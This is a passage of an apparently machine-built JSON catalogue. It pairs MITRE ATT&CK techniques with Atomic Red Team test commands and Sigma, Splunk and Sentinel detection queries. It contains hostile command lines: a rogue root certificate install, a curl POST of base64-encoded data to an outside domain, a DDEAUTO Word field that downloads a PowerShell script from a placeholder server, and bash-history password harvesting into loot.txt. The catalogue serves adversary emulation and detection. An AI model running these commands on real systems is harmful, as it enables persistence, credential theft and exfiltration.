(EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"*\\\\SOFTWARE\\\\Microsoft\\\\Netsh\\\\*\"", "product": "Azure Sentinel", "name": "Narsh Helper DLL Registry"}, {"query": "Sysmon| where EventID == 1and (process_path contains \"netsh.exe\"and process_command_line contains \"*helper*\")", "product": "Azure Sentinel", "name": "Netsh Helper DLL Process"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1130/T1130.yaml", "command": "openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -out #{cert_filename}\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "name": null}, {"source": "atomics/T1130/T1130.yaml", "command": "openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -out rootCA.crt\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "name": null}], "command_list": ["openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -out #{cert_filename}\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "openssl genrsa -out rootCA.key 4096\nopenssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -out rootCA.crt\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n"], "technique_id": "T1130", "parsed_datasets": [{"Atomic Red Team Test - Install Root Certificate": {"display_name": "Install Root Certificate", "atomic_tests": [{"description": "Creates a root CA with openssl\n", "supported_platforms": ["linux"], "name": "Install root CA on CentOS/RHEL", "input_arguments": {"key_filename": {"default": "rootCA.key", "type": "Path", "description": "Key we create that is used to create the CA certificate"}, "cert_filename": {"default": "rootCA.crt", "type": "Path", "description": "Path of the CA certificate we create"}}, "executor": {"command": "openssl genrsa -out #{key_filename} 4096\nopenssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -out #{cert_filename}\n\nif [ $(rpm -q --queryformat '%{VERSION}' centos-release) -le \"5\" ];\nthen\n  cat rootCA.crt >> /etc/pki/tls/certs/ca-bundle.crt\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -ge \"7\" ];\n  cp rootCA.crt /etc/pki/ca-trust/source/anchors/\n  update-ca-trust\nfi\n", "name": "sh"}}], "attack_technique": "T1130"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and process_path !contains \"svchost.exe\"and (registry_key_path contains \"*\\\\SOFTWARE\\\\Microsoft\\\\EnterpriseCertificates\\\\Root\\\\Certificates\\\\*\"or registry_key_path contains \"*\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\Certificates\\\\*\")", "product": "Azure Sentinel", "name": "Install Root Certificates"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1132/T1132.yaml", "command": "echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.#{destination_url}\n", "name": null}, {"source": "atomics/T1132/T1132.yaml", "command": "echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.redcanary.com\n", "name": null}], "command_list": ["echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.#{destination_url}\n", "echo -n 111-11-1111 | base64\ncurl -XPOST MTExLTExLTExMTE=.redcanary.com\n"], "technique_id": "T1132", "parsed_datasets": [{"Atomic Red Team Test - Data Encoding": {"display_name": "Data Encoding", "atomic_tests": [{"description": "Utilizing a common technique for posting base64 encoded data.\n", "supported_platforms": ["macos", "linux"], "name": "Base64 Encoded data.", "input_arguments": {"base64_data": {"default": "MTExLTExLTExMTE=", "type": "string", "description": "Encoded data to post using fake Social Security number 111-11-1111."}, "destination_url": {"default": "redcanary.com", "type": "string", "description": "Destination URL to post encoded data."}}, "executor": {"command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n", "name": "sh"}}], "attack_technique": "T1132"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1137", "parsed_datasets": [{"Atomic Red Team Test - Office Application Startup": {"display_name": "Office Application Startup", "atomic_tests": [{"description": "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n", "supported_platforms": ["windows"], "name": "DDEAUTO", "executor": {"steps": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n", "name": "manual"}}], "attack_technique": "T1137"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1138/T1138.yaml", "command": "sdbinst.exe PathToAtomicsFolder\\T1138\\src\\AtomicShimx86.sdb\nsdbinst.exe -u PathToAtomicsFolder\\T1138\\src\\AtomicShimx86.sdb\n", "name": null}, {"source": "atomics/T1138/T1138.yaml", "command": "Copy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb\n", "name": null}, {"source": "atomics/T1138/T1138.yaml", "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\n", "name": null}, {"source": "Threat Hunting Tables", "command": "*.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom", "name": "registry_path"}, {"source": "Threat Hunting Tables", "command": "*.exe reg add", "name": null}, {"source": "Threat Hunting Tables", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "name": "registry_path"}, {"source": "SysmonHunter - Application Shimming", "command": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDBsdbinst.exe", "name": null}, {"source": "SysmonHunter - Application Shimming", "command": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "name": null}], "command_list": ["sdbinst.exe PathToAtomicsFolder\\T1138\\src\\AtomicShimx86.sdb\nsdbinst.exe -u PathToAtomicsFolder\\T1138\\src\\AtomicShimx86.sdb\n", "Copy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb\n", "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\n", "*.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom", "*.exe reg add", "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDBsdbinst.exe", "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"], "technique_id": "T1138", "parsed_datasets": [{"Atomic Red Team Test - Application Shimming": {"display_name": "Application Shimming", "atomic_tests": [{"dependencies": [{"description": "Shim database file must exist on disk at specified location (#{file_path})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1138/src/AtomicShimx86.sdb\" -OutFile \"#{file_path}\"\n", "prereq_command": "if (Test-Path #{file_path}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Application Shim Installation", "executor": {"elevation_required": true, "command": "sdbinst.exe #{file_path}\nsdbinst.exe -u #{file_path}\n", "name": "command_prompt"}, "description": "To test injecting DLL into a custom application\nyou need to copy AtomicShim.dll Into C:\\Tools\nAs well as Compile the custom app.\nWe believe observing the shim install is a good\nplace to start.\n", "input_arguments": {"file_path": {"default": "PathToAtomicsFolder\\T1138\\src\\AtomicShimx86.sdb", "type": "String", "description": "Path to the shim databaase file"}}, "dependency_executor_name": "powershell"}, {"description": "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "supported_platforms": ["windows"], "name": "New shim database files created in the default shim database directory", "executor": {"elevation_required": true, "command": "Copy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb\nCopy-Item $PathToAtomicsFolder\\T1138\\bin\\T1138CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb\n", "name": "powershell", "cleanup_command": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1138CompatDatabase.sdb -ErrorAction Ignore\nRemove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1138CompatDatabase.sdb -ErrorAction Ignore\n"}}, {"description": "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n", "supported_platforms": ["windows"], "name": "Registry key creation and/or modification events for SDB", "executor": {"elevation_required": true, "command": "New-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\nNew-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -Value \"AtomicRedTeamT1138\"\n", "name": "powershell", "cleanup_command": "Remove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom\" -Name \"AtomicRedTeamT1138\" -ErrorAction Ignore\nRemove-ItemProperty -Path HKLM:\"\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB\" -Name \"AtomicRedTeamT1138\" -ErrorAction Ignore\n"}}], "attack_technique": "T1138"}}, {"Threat Hunting Tables": {"mitre_attack": "T1138", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100182", "registry_value": "", "mitre_caption": "application_shimming", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom", "frequency": "low", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1138", "file_value": "", "file_path": "", "parent_process": "*.exe", "itw_sample": "", "chain_id": "100183", "registry_value": "", "mitre_caption": "application_shimming", "registry_path": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB", "frequency": "low", "commandline_string": "reg add", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1138": {"phase": "Persistence", "query": [{"process": {"cmdline": {"pattern": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"}, "image": {"pattern": "sdbinst.exe"}}, "type": "process"}, {"type": "reg", "reg": {"path": {"pattern": "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom|\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"}}}], "description": null, "name": "Application Shimming", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 11and file_name contains \"C:\\\\Windows\\\\AppPatch\\\\Custom\\\\\"", "product": "Azure Sentinel", "name": "Application Shimming FileAccess"}, {"query": "Sysmon| where EventID == 1and process_path contains \"sdbinst.exe\"", "product": "Azure Sentinel", "name": "Application Shimming Process"}, {"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB\\\\\"", "product": "Azure Sentinel", "name": "Application Shimming Registry"}, {"query": "title: Possible Shim Database Persistence via sdbinst.exe\nid: 517490a7-115a-48c6-8862-1a481504d5a8\nstatus: experimental\ndescription: Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\ntags:\n    - attack.persistence\n    - attack.t1138\nauthor: Markus Neis\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\sdbinst.exe'\n        CommandLine:\n            - '*.sdb*'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Shim Database Persistence via sdbinst.exe\nid: 517490a7-115a-48c6-8862-1a481504d5a8\nstatus: experimental\ndescription: Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\ntags:\n    - attack.persistence\n    - attack.t1138\nauthor: Markus Neis\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\sdbinst.exe'\n        CommandLine:\n            - '*.sdb*'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\sdbinst.exe) AND CommandLine.keyword:(*.sdb*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Shim-Database-Persistence-via-sdbinst.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Shim Database Persistence via sdbinst.exe\",\\n    \"description\": \"Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1138\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\sdbinst.exe) AND CommandLine.keyword:(*.sdb*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\sdbinst.exe) AND CommandLine.keyword:(*.sdb*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Shim Database Persistence via sdbinst.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\sdbinst.exe) AND CommandLine.keyword:(*.sdb*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\sdbinst.exe\") (CommandLine=\"*.sdb*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\sdbinst.exe\"] CommandLine IN [\"*.sdb*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\sdbinst\\\\.exe))(?=.*(?:.*.*\\\\.sdb.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1139/T1139.yaml", "command": "cat ~/.bash_history | grep #{bash_history_grep_args} > #{output_file}\n", "name": null}, {"source": "atomics/T1139/T1139.yaml", "command": "cat ~/.bash_history | grep #{bash_history_grep_args} > ~/loot.txt\n", "name": null}, {"source": "atomics/T1139/T1139.yaml", "command": "cat #{bash_history_filename} | grep -e '-p ' -e 'pass' -e 'ssh' > #{output_file}\n", "name": null}, {"source": "data/abilities/credential-access/422526ec-27e9-429a-995b-c686a29561a4.yml", "command": {"darwin": {"sh": {"command": "cat ~/.bash_history"}}, "linux": {"sh": {"command": "cat ~/.bash_history"}}}, "name": "Get contents of bash history"}, {"source": "Threat Hunting Tables", "command": "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt", "name": null}, {"source": "Threat Hunting Tables", "command": "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > out.txt", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/pillage_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/linux/pillage_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/pillage_user", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/pillage_user", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "cat .bash_history | grep password > bash.txt", "name": null}], "command_list": ["cat ~/.bash_history | grep #{bash_history_grep_args} > #{output_file}\n", "cat ~/.bash_history | grep #{bash_history_grep_args} > ~/loot.txt\n", "cat #{bash_history_filename} | grep -e '-p ' -e 'pass' -e 'ssh' > #{output_file}\n", {"darwin": {"sh": {"command": "cat ~/.bash_history"}}, "linux": {"sh": {"command": "cat ~/.bash_history"}}}, "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt", "bash cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > out.txt", "python/collection/linux/pillage_user", "python/collection/linux/pillage_user", "python/collection/osx/pillage_user", "python/collection/osx/pillage_user", "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}", "cat .bash_history | grep password > bash.txt"], "technique_id": "T1139", "parsed_datasets": [{"Atomic Red Team Test - Bash History": {"display_name": "Bash History", "atomic_tests": [{"description": "Search through bash history for specifice commands we want to capture\n", "supported_platforms": ["linux", "macos"], "name": "Search Through Bash History", "input_arguments": {"bash_history_filename": {"default": "~/.bash_history", "type": "Path", "description": "Path of the bash history file to capture"}, "output_file": {"default": "~/loot.txt", "type": "Path", "description": "Path where captured results will be placed"}, "bash_history_grep_args": {"default": "-e '-p ' -e 'pass' -e 'ssh'", "type": "Path", "description": "grep arguments that filter out specific commands we want to capture"}}, "executor": {"command": "cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}\n", "name": "sh"}}], "attack_technique": "T1139"}}, {"Mitre Stockpile - Get contents of bash history": {"platforms": {"darwin": {"sh": {"command": "cat ~/.bash_history"}}, "linux": {"sh": {"command": "cat ~/.bash_history"}}}, "description": "Get contents of bash history", "tactic": "credential-access", "technique": {"attack_id": "T1139", "name": "Bash History"}, "id": "422526ec-27e9-429a-995b-c686a29561a4", "name": "Dump history"}}, {"Threat Hunting Tables": {"mitre_attack": "T1139", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100190", "registry_value": "", "mitre_caption": "bash_history", "registry_path": "", "frequency": "high", "commandline_string": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot.txt", "loaded_dll": "", "os": "mac", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1139", "file_value": "", "file_path": "", "parent_process": "bash", "itw_sample": "", "chain_id": "100201", "registry_value": "", "mitre_caption": "bash_history", "registry_path": "", "frequency": "high", "commandline_string": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > out.txt", "loaded_dll": "", "os": "linux", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1139", "Empire Module": "python/collection/linux/pillage_user", "Technique": "Bash History", "ATT&CK Technique #2": "T1212", "Concatenate for Python Dictionary": "\"python/collection/linux/pillage_user\":  [\"T1139\",\"T1212\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1139", "Empire Module": "python/collection/osx/pillage_user", "Technique": "Bash History", "ATT&CK Technique #2": "T1033", "Concatenate for Python Dictionary": "\"python/collection/osx/pillage_user\":  [\"T1139\",\"T1033\"],"}}], "queries": [{"query": "index=linux sourcetype=\"linux_audit\" syscall=257 key=bash_history_changes | table host,auid,syscall,syscall_name,exe", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=bash_history cat bash_history | table _time,host,user_name,bash_command", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1140/T1140.yaml", "command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%T1140_calc_decoded.exe\n", "name": null}, {"source": "atomics/T1140/T1140.yaml", "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -decode C:\\Windows\\System32\\calc.exe %temp%\\T1140.txt\n", "name": null}, {"source": "Threat Hunting Tables", "command": "certutil.exe -decode", "name": null}, {"source": "SysmonHunter - Deobfuscate/Decode Files or Information", "command": "-decode|-urlcachecertutil.exe", "name": null}, {"source": "SysmonHunter - Deobfuscate/Decode Files or Information", "command": "certutil.exe|-decode|-urlcache", "name": null}], "command_list": ["certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%T1140_calc_decoded.exe\n", "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -decode C:\\Windows\\System32\\calc.exe %temp%\\T1140.txt\n", "certutil.exe -decode", "-decode|-urlcachecertutil.exe", "certutil.exe|-decode|-urlcache"], "technique_id": "T1140", "parsed_datasets": [{"Atomic Red Team Test - Deobfuscate/Decode Files Or Information": {"display_name": "Deobfuscate/Decode Files Or Information", "atomic_tests": [{"description": "Encode/Decode executable\n", "supported_platforms": ["windows"], "name": "Deobfuscate/Decode Files Or Information", "input_arguments": {"executable": {"default": "C:\\Windows\\System32\\calc.exe", "type": "path", "description": "name of executable"}}, "executor": {"elevation_required": false, "command": "certutil -encode #{executable} %temp%\\T1140_calc.txt\ncertutil -decode %temp%\\T1140_calc.txt %temp%T1140_calc_decoded.exe\n", "name": "command_prompt", "cleanup_command": "del %temp%\\T1140_calc.txt >nul 2>&1\ndel %temp%T1140_calc_decoded.exe >nul 2>&1\n"}}, {"description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n", "supported_platforms": ["windows"], "name": "Certutil Rename and Decode", "input_arguments": {"executable": {"default": "C:\\Windows\\System32\\calc.exe", "type": "path", "description": "name of executable/file to decode"}}, "executor": {"elevation_required": false, "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp\n%temp%\\tcm.tmp -decode #{executable} %temp%\\T1140.txt\n", "name": "command_prompt", "cleanup_command": "del %temp%\\tcm.tmp >nul 2>&1\ndel %temp%\\T1140.txt >nul 2>&1\n"}}], "attack_technique": "T1140"}}, {"Threat Hunting Tables": {"mitre_attack": "T1140", "file_value": "", "file_path": "", "parent_process": "certutil.exe", "itw_sample": "c0d67fa9ef4292d1e6f18005163f1d86fbe18f68a6ef70e0744f12b12f44cf7c", "chain_id": "100014", "registry_value": "", "mitre_caption": "deobfuscation", "registry_path": "", "frequency": "rare", "commandline_string": "-decode", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"SysmonHunter - T1140": {"phase": "Defense Evasion, Execution", "query": [{"process": {"cmdline": {"pattern": "-decode|-urlcache"}, "image": {"pattern": "certutil.exe"}}, "type": "process"}, {"process": {"cmdline": {"pattern": "certutil.exe|-decode|-urlcache"}}, "type": "process"}], "description": null, "name": "Deobfuscate/Decode Files or Information", "level": "high"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"certutil.exe\"and process_command_line contains \"decode\")", "product": "Azure Sentinel", "name": "Deobfuscate Decode Files Or Information"}, {"query": "title: Encoded FromBase64String\nid: fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c\nstatus: experimental\ndescription: Detects a base64 encoded FromBase64String keyword in a process command line\nauthor: Florian Roth\ndate: 2019/08/24\ntags:\n    - attack.t1086\n    - attack.t1140\n    - attack.execution\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|base64offset|contains: '::FromBase64String'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Encoded FromBase64String\nid: fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c\nstatus: experimental\ndescription: Detects a base64 encoded FromBase64String keyword in a process command line\nauthor: Florian Roth\ndate: 2019/08/24\ntags:\n    - attack.t1086\n    - attack.t1140\n    - attack.execution\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|base64offset|contains: '::FromBase64String'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - 